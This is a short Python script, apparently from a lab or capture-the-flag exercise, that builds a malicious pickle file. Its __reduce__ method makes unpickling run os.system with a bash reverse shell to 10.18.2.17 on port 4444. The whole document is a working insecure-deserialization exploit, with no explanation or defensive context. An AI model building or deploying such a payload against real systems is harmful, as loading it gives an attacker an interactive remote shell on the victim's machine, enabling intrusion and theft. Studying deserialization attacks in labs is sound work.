#!/usr/bin/env python3

import pickle, os

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("bash -c 'bash -i >& /dev/tcp/10.18.2.17/4444 0>&1'",))

pickle.dump(SerializedPickle(), open('pickled','wb'))
